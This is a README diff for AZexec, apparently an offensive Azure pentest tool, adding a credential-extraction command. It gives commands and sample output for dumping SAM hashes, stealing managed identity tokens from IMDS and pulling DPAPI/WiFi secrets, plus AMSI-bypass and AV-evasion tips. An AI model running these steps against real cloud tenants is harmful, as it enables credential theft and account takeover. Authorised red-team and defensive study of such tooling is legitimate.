@@ -44,6 +44,7 @@
 - [Workstation Service (wkssvc) Equivalent](#-workstation-service-wkssvc-equivalent-vm-loggedon-command)
 - [Azure Resource Manager Enumeration](#️-azure-resource-manager-enumeration-multi-subscription)
 - [File Transfer (get-file/put-file)](#file-transfer-get-file--put-file)
+- [Credential Extraction (creds)](#-credential-extraction---netexec---sam-equivalent)
 - [Remote Command Execution](#-remote-command-execution---azures-netexec--x-x-equivalent)
 - [Getting Shells - Empire and Metasploit](#-getting-shells---empire-and-metasploit-integration)
 - [Features](#-features)
@@ -131,6 +132,10 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> --spider --pattern txt,doc` | `.\azx.ps1 spider -Pattern "txt,docx,key,pem,pfx,config"` | ✅ Required | **Spider with pattern filter** |
 | `nxc smb <target> --get-file \\C$\file.txt /local/file.txt` | `.\azx.ps1 get-file -VMName "vm" -RemotePath "C:\file.txt" -LocalPath ".\file.txt"` | ✅ Required | **Download file from target** |
 | `nxc smb <target> --put-file /local/file.txt \\C$\file.txt` | `.\azx.ps1 put-file -VMName "vm" -LocalPath ".\file.txt" -RemotePath "C:\file.txt"` | ✅ Required | **Upload file to target** |
+| `nxc smb <target> --sam` | `.\azx.ps1 creds -VMName "vm"` | ✅ Required | **Extract SAM hashes** (registry hive dump) |
+| `nxc smb <target> --sam` (all targets) | `.\azx.ps1 creds -AllVMs -CredMethod sam` | ✅ Required | **Extract SAM from all VMs** |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm" -CredMethod tokens` | ✅ Required | **Extract Managed Identity tokens** (IMDS) |
+| *N/A (Azure-specific)* | `.\azx.ps1 creds -VMName "vm" -CredMethod dpapi` | ✅ Required | **Extract DPAPI secrets** (WiFi, CredMan, browsers) |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
 
@@ -1595,6 +1600,129 @@ AZR    vm-web-01            VM     PUT    C:\Windows\Temp\payload.ps1    [+] SUC
 [*] TRANSFER SUMMARY
 [*] Files Transferred: 1 | Total Size: 1.2KB | Errors: 0
 ```
+
+---
+
+## 🔐 Credential Extraction - NetExec --sam Equivalent
+
+For penetration testers familiar with NetExec's credential dumping capabilities (`--sam`), AZexec provides the **Azure cloud equivalent** through the `creds` command. This command extracts credentials from Azure VMs and Arc-enabled devices using multiple extraction techniques.
+
+### Extraction Methods
+
+| Method | Description | Target OS | Risk Level |
+|--------|-------------|-----------|------------|
+| **sam** | SAM/SYSTEM/SECURITY registry hive extraction | Windows | HIGH - triggers MDE alerts |
+| **tokens** | Managed Identity JWT tokens from IMDS (169.254.169.254) | Windows/Linux | MEDIUM - Azure-specific |
+| **dpapi** | DPAPI secrets (WiFi PSK, Credential Manager, browser paths) | Windows | MEDIUM |
+| **all** | All extraction methods (default for `auto`) | Windows/Linux | HIGH |
+
+### NetExec to AZexec Comparison
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb <target> --sam` | `.\azx.ps1 creds -VMName "vm-01"` | Extract SAM hashes from single target |
+| `nxc smb <targets> --sam` | `.\azx.ps1 creds -AllVMs -CredMethod sam` | Extract SAM from all VMs |
+| *N/A* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod tokens` | Extract Managed Identity tokens |
+| *N/A* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod dpapi` | Extract DPAPI secrets |
+
+### Quick Start Examples
+
+```powershell
+# SAM extraction (NetExec --sam equivalent)
+.\azx.ps1 creds -VMName "vm-web-01"
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod sam
+.\azx.ps1 creds -AllVMs -ResourceGroup "Production-RG"
+
+# Managed Identity token extraction (Azure-specific)
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod tokens
+.\azx.ps1 creds -AllVMs -CredMethod tokens
+
+# DPAPI secrets (browser creds, credential manager, WiFi)
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod dpapi
+
+# All extraction methods
+.\azx.ps1 creds -VMName "vm-web-01" -CredMethod all
+
+# Arc devices
+.\azx.ps1 creds -DeviceName "arc-server-01"
+.\azx.ps1 creds -AllDevices -CredMethod sam
+
+# Export for cracking
+.\azx.ps1 creds -VMName "vm-01" -HashcatFormat -ExportPath hashes.txt
+.\azx.ps1 creds -AllVMs -ExportPath results.json
+```
+
+### OPSEC Considerations
+
+> ⚠️ **WARNING**: Credential extraction triggers security alerts!
+
+The `creds` command will display an OPSEC warning before execution:
+
+```
+[!] OPSEC WARNING: Credential Extraction Detection Risk
+[!] This operation may trigger:
+    - MDE: 'Credential dumping activity detected'
+    - Azure Security Center: 'Suspicious PowerShell execution'
+    - Event ID 4656/4663: SAM registry key access
+    - Event ID 4688: reg.exe execution
+[*] Use -AmsiBypass for evasion (same as exec command)
+```
+
+### Sample Output
+
+```
+[*] AZX - Credential Extraction
+[*] Command: creds (Azure equivalent of nxc smb --sam)
+
+[*] Target: vm-web-01 (Windows Server 2022)
+AZR    vm-web-01            443    Windows     (SAM_DUMP)
+AZR    vm-web-01            443    Windows     Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+AZR    vm-web-01            443    Windows     Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+AZR    vm-web-01            443    Windows     svc_backup:1001:aad3b435b51404ee:e52cac67419a6a9a42f8b3674a46f48b:::
+AZR    vm-web-01            443    Windows     (TOKEN_DUMP)
+AZR    vm-web-01            443    Windows     MI Token: management.azure.com (expires: 3600s)
+AZR    vm-web-01            443    Windows     MI Token: graph.microsoft.com (expires: 3600s)
+AZR    vm-web-01            443    Windows     (DPAPI_DUMP)
+AZR    vm-web-01            443    Windows     WiFi: CorpWiFi -> [PLAINTEXT] SecretKey123
+AZR    vm-web-01            443    Windows     CredMan: Domain:target=server01 -> user@domain.com
+AZR    vm-web-01            443    Windows     Browser: Chrome Login Data found (extract offline)
+
+[*] EXTRACTION SUMMARY
+[*] Targets: 1 | SAM Hashes: 3 | Tokens: 2 | DPAPI Secrets: 3 | Errors: 0
+```
+
+### Technical Details
+
+#### SAM Extraction Workflow
+1. PowerShell script deployed via VM Run Command (vmrun) or Arc Run Command (arc)
+2. Registry hives exported using `reg.exe save` (better AV evasion)
+3. Hives base64-encoded for transfer via Run Command output
+4. Hives decoded locally and parsed:
+   - **Primary**: `secretsdump.py` (Impacket) if available
+   - **Fallback**: Manual bootkey extraction and SAM decryption
+
+#### Token Extraction Workflow
+1. Query Azure Instance Metadata Service (IMDS) at `169.254.169.254`
+2. Request tokens for multiple Azure resources:
+   - `management.azure.com` (Azure Resource Manager)
+   - `graph.microsoft.com` (Microsoft Graph)
+   - `vault.azure.net` (Key Vault)
+   - `storage.azure.com` (Storage)
+3. Return JWT tokens with expiration times
+
+#### DPAPI Extraction Workflow
+1. **Credential Manager**: Parse `cmdkey /list` output
+2. **WiFi Profiles**: Extract PSKs via `netsh wlan show profile key=clear`
+3. **Browser Credentials**: Identify Login Data paths for offline extraction
+
+### Required Permissions
+
+| Target Type | Required Permissions |
+|-------------|---------------------|
+| **Azure VMs** | Reader + Virtual Machine Command Executor (or VM Contributor) |
+| **Arc Devices** | Azure Connected Machine Resource Administrator |
+| **MDE Devices** | Machine.LiveResponse + Machine.Read.All |
+| **Intune Devices** | DeviceManagementManagedDevices.PrivilegedOperations.All |
 
 ---
 
